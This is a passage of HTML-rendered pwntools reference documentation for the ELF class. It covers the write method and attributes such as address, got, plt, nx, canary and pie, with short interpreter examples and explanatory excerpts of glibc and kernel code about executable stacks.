<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.write">
<code class="descname">write</code><span class="sig-paren">(</span><em>address</em>, <em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1139-1164"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.write" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes data to the specified virtual address</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Virtual address to write</li>
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Bytes to write</li>
</ul>
</td>
</tr>
</tbody>
</table>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This routine does not check the bounds on the write to ensure
that it stays in the same segment.</p>
</div>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="go">&#39;ELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s2">&quot;HELO&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;HELO&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.address">
<code class="descname">address</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.address" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Address of the lowest segment loaded in the ELF.</p>
<p>When updated, the addresses of the following fields are also updated:</p>
<ul class="simple">
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.symbols" title="pwnlib.elf.elf.ELF.symbols"><code class="xref py py-attr docutils literal"><span class="pre">symbols</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.got" title="pwnlib.elf.elf.ELF.got"><code class="xref py py-attr docutils literal"><span class="pre">got</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.plt" title="pwnlib.elf.elf.ELF.plt"><code class="xref py py-attr docutils literal"><span class="pre">plt</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.functions" title="pwnlib.elf.elf.ELF.functions"><code class="xref py py-attr docutils literal"><span class="pre">functions</span></code></a></li>
</ul>
<p>However, the following fields are <strong>NOT</strong> updated:</p>
<ul class="simple">
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.segments" title="pwnlib.elf.elf.ELF.segments"><code class="xref py py-attr docutils literal"><span class="pre">segments</span></code></a></li>
<li><a class="reference internal" href="#pwnlib.elf.elf.ELF.sections" title="pwnlib.elf.elf.ELF.sections"><code class="xref py py-attr docutils literal"><span class="pre">sections</span></code></a></li>
</ul>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">read</span> <span class="o">=</span> <span class="n">bash</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">text</span> <span class="o">=</span> <span class="n">bash</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">read</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">==</span> <span class="n">bash</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">text</span> <span class="o">==</span> <span class="n">bash</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.arch">
<code class="descname">arch</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.arch" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Architecture of the file (e.g. <code class="docutils literal"><span class="pre">'i386'</span></code>, <code class="docutils literal"><span class="pre">'arm'</span></code>).</p>
<p>See: <a class="reference internal" href="index.html#pwnlib.context.ContextType.arch" title="pwnlib.context.ContextType.arch"><code class="xref py py-attr docutils literal"><span class="pre">ContextType.arch</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.asan">
<code class="descname">asan</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.asan" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary was built with
Address Sanitizer (<code class="docutils literal"><span class="pre">ASAN</span></code>).</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.aslr">
<code class="descname">aslr</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.aslr" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary is position-independent.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.bits">
<code class="descname">bits</code><em class="property"> = 32</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.bits" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Bit-ness of the file</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.build">
<code class="descname">build</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.build" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Linux kernel build commit, if this is a Linux kernel image</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.buildid">
<code class="descname">buildid</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.buildid" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; GNU Build ID embedded into the binary</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.bytes">
<code class="descname">bytes</code><em class="property"> = 4</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.bytes" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Pointer width, in bytes</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.canary">
<code class="descname">canary</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.canary" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary uses stack canaries.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.config">
<code class="descname">config</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.config" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">dict</span></code></a> &#8211; Linux kernel configuration, if this is a Linux kernel image</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.data">
<code class="descname">data</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.data" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Raw data of the ELF file.</p>
<dl class="docutils">
<dt>See:</dt>
<dd><code class="xref py py-meth docutils literal"><span class="pre">get_data()</span></code></dd>
</dl>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.dwarf">
<code class="descname">dwarf</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.dwarf" title="Permalink to this definition">¶</a></dt>
<dd><p>DWARF info for the elf</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.elftype">
<code class="descname">elftype</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.elftype" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; ELF type (<code class="docutils literal"><span class="pre">EXEC</span></code>, <code class="docutils literal"><span class="pre">DYN</span></code>, etc)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.endian">
<code class="descname">endian</code><em class="property"> = 'little'</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.endian" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Endianness of the file (e.g. <code class="docutils literal"><span class="pre">'big'</span></code>, <code class="docutils literal"><span class="pre">'little'</span></code>)</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.entry">
<code class="descname">entry</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.entry" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Address of the entry point for the ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.entrypoint">
<code class="descname">entrypoint</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.entrypoint" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">int</span></code></a> &#8211; Address of the entry point for the ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.execstack">
<code class="descname">execstack</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.execstack" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary uses an executable stack.</p>
<p>This is based on the presence of a program header <a class="reference external" href="https://refspecs.linuxbase.org/LSB_3.0.0/LSB-PDA/LSB-PDA/progheader.html">PT_GNU_STACK</a>
being present, and its setting.</p>
<blockquote>
<div><p><code class="docutils literal"><span class="pre">PT_GNU_STACK</span></code></p>
<p>The p_flags member specifies the permissions on the segment
containing the stack and is used to indicate wether the stack
should be executable. The absense of this header indicates
that the stack will be executable.</p>
</div></blockquote>
<p>In particular, if the header is missing the stack is executable.
If the header is present, it may <strong>explicitly</strong> mark that the stack is
executable.</p>
<p>This is only somewhat accurate.  When using the GNU Linker, it usees
<a class="reference external" href="https://github.com/bminor/glibc/blob/glibc-2.25/elf/dl-load.c#L1036-L1038">DEFAULT_STACK_PERMS</a> to decide whether a lack of <code class="docutils literal"><span class="pre">PT_GNU_STACK</span></code>
should mark the stack as executable:</p>
<div class="highlight-c"><div class="highlight"><pre><span></span><span class="cm">/* On most platforms presume that PT_GNU_STACK is absent and the stack is</span>
<span class="cm"> * executable.  Other platforms default to a nonexecutable stack and don&#39;t</span>
<span class="cm"> * need PT_GNU_STACK to do so.  */</span>
<span class="kt">uint_fast16_t</span> <span class="n">stack_flags</span> <span class="o">=</span> <span class="n">DEFAULT_STACK_PERMS</span><span class="p">;</span>
</pre></div>
</div>
<p>By searching the source for <code class="docutils literal"><span class="pre">DEFAULT_STACK_PERMS</span></code>, we can see which
architectures have which settings.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$ git grep &#39;#define DEFAULT_STACK_PERMS&#39; | grep -v PF_X
sysdeps/aarch64/stackinfo.h:31:#define DEFAULT_STACK_PERMS (PF_R|PF_W)
sysdeps/nios2/stackinfo.h:31:#define DEFAULT_STACK_PERMS (PF_R|PF_W)
sysdeps/tile/stackinfo.h:31:#define DEFAULT_STACK_PERMS (PF_R|PF_W)
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.executable">
<code class="descname">executable</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.executable" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="docutils literal"><span class="pre">True</span></code> if the ELF is an executable</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.executable_segments">
<code class="descname">executable_segments</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.executable_segments" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; List of all segments which are executable.</p>
<dl class="docutils">
<dt>See:</dt>
<dd><a class="reference internal" href="#pwnlib.elf.elf.ELF.segments" title="pwnlib.elf.elf.ELF.segments"><code class="xref py py-attr docutils literal"><span class="pre">ELF.segments</span></code></a></dd>
</dl>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.file">
<code class="descname">file</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.file" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.ELF.file" title="pwnlib.elf.elf.ELF.file"><code class="xref py py-class docutils literal"><span class="pre">file</span></code></a> &#8211; Open handle to the ELF file on disk</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.fortify">
<code class="descname">fortify</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.fortify" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary was built with
Fortify Source (<code class="docutils literal"><span class="pre">-DFORTIFY</span></code>).</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.functions">
<code class="descname">functions</code><em class="property"> = {}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.functions" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.dotdict" title="pwnlib.elf.elf.dotdict"><code class="xref py py-class docutils literal"><span class="pre">dotdict</span></code></a> of <code class="docutils literal"><span class="pre">name</span></code> to <a class="reference internal" href="#pwnlib.elf.elf.Function" title="pwnlib.elf.elf.Function"><code class="xref py py-class docutils literal"><span class="pre">Function</span></code></a> for each function in the ELF</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.got">
<code class="descname">got</code><em class="property"> = {}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.got" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.dotdict" title="pwnlib.elf.elf.dotdict"><code class="xref py py-class docutils literal"><span class="pre">dotdict</span></code></a> of <code class="docutils literal"><span class="pre">name</span></code> to <code class="docutils literal"><span class="pre">address</span></code> for all Global Offset Table (GOT) entries</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.libc">
<code class="descname">libc</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.libc" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">ELF</span></code></a> &#8211; If this <a class="reference internal" href="#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">ELF</span></code></a> imports any libraries which contain <code class="docutils literal"><span class="pre">'libc[.-]</span></code>,
and we can determine the appropriate path to it on the local
system, returns a new <a class="reference internal" href="#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><code class="xref py py-class docutils literal"><span class="pre">ELF</span></code></a> object pertaining to that library.</p>
<p>If not found, the value will be <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.library">
<code class="descname">library</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.library" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="docutils literal"><span class="pre">True</span></code> if the ELF is a shared library</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.memory">
<code class="descname">memory</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.memory" title="Permalink to this definition">¶</a></dt>
<dd><p>IntervalTree which maps all of the loaded memory segments</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.mmap">
<code class="descname">mmap</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.mmap" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/mmap.html#mmap.mmap" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">mmap.mmap</span></code></a> &#8211; Memory-mapped copy of the ELF file on disk</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.msan">
<code class="descname">msan</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.msan" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary was built with
Memory Sanitizer (<code class="docutils literal"><span class="pre">MSAN</span></code>).</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.non_writable_segments">
<code class="descname">non_writable_segments</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.non_writable_segments" title="Permalink to this definition">¶</a></dt>
<dd><p><code class="xref py py-class docutils literal"><span class="pre">list</span></code> &#8211; List of all segments which are NOT writeable.</p>
<dl class="docutils">
<dt>See:</dt>
<dd><a class="reference internal" href="#pwnlib.elf.elf.ELF.segments" title="pwnlib.elf.elf.ELF.segments"><code class="xref py py-attr docutils literal"><span class="pre">ELF.segments</span></code></a></dd>
</dl>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.nx">
<code class="descname">nx</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.nx" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary uses NX protections.</p>
<p>Specifically, we are checking for <code class="docutils literal"><span class="pre">READ_IMPLIES_EXEC</span></code> being set
by the kernel, as a result of honoring <code class="docutils literal"><span class="pre">PT_GNU_STACK</span></code> in the kernel.</p>
<p>The <strong>Linux kernel</strong> directly honors <code class="docutils literal"><span class="pre">PT_GNU_STACK</span></code> to <a class="reference external" href="https://github.com/torvalds/linux/blob/v4.9/fs/binfmt_elf.c#L784-L789">mark the
stack as executable.</a></p>
<div class="highlight-c"><div class="highlight"><pre><span></span><span class="k">case</span> <span class="nl">PT_GNU_STACK</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">elf_ppnt</span><span class="o">-&gt;</span><span class="n">p_flags</span> <span class="o">&amp;</span> <span class="n">PF_X</span><span class="p">)</span>
        <span class="n">executable_stack</span> <span class="o">=</span> <span class="n">EXSTACK_ENABLE_X</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">executable_stack</span> <span class="o">=</span> <span class="n">EXSTACK_DISABLE_X</span><span class="p">;</span>
    <span class="k">break</span><span class="p">;</span>
</pre></div>
</div>
<p>Additionally, it then sets <code class="docutils literal"><span class="pre">read_implies_exec</span></code>, so that <a class="reference external" href="https://github.com/torvalds/linux/blob/v4.9/fs/binfmt_elf.c#L849-L850">all readable pages
are executable</a>.</p>
<div class="highlight-c"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">elf_read_implies_exec</span><span class="p">(</span><span class="n">loc</span><span class="o">-&gt;</span><span class="n">elf_ex</span><span class="p">,</span> <span class="n">executable_stack</span><span class="p">))</span>
    <span class="n">current</span><span class="o">-&gt;</span><span class="n">personality</span> <span class="o">|=</span> <span class="n">READ_IMPLIES_EXEC</span><span class="p">;</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.packed">
<code class="descname">packed</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.packed" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary is packed with UPX.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.path">
<code class="descname">path</code><em class="property"> = '/path/to/the/file'</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.path" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; Path to the file</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.pie">
<code class="descname">pie</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.pie" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the current binary is position-independent.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.elf.elf.ELF.plt">
<code class="descname">plt</code><em class="property"> = {}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.plt" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference internal" href="#pwnlib.elf.elf.dotdict" title="pwnlib.elf.elf.dotdict"><code class="xref py py-class docutils literal"><span class="pre">dotdict</span></code></a> of <code class="docutils literal"><span class="pre">name</span></code> to <code class="docutils literal"><span class="pre">address</span></code> for all Procedure Linkate Table (PLT) entries</p>
</dd></dl>

<dl class="attribute">
